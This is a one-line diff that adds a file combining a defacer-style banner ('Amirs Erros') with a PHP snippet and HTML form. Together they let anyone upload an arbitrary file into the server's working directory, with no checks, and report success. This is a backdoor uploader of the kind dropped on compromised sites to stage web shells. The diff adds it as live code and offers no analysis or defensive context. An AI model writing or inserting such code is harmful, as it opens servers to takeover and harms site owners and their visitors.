@@ -1,0 +1,1 @@
+<p align="center"><b><font size="5" face="Comic Sans MS">Amirs Erros |~~></font> <?$msg = copy($_FILES[hambas][tmp_name],$_FILES[hambas][name]) ? " works" : "notworks";echo $_FILES[hambas][name];echo $msg;?><form ENCTYPE="multipart/form-data" ACTION="" METHOD="POST"><input NAME="hambas" TYPE="file"><input VALUE="submit" TYPE="submit"></form>
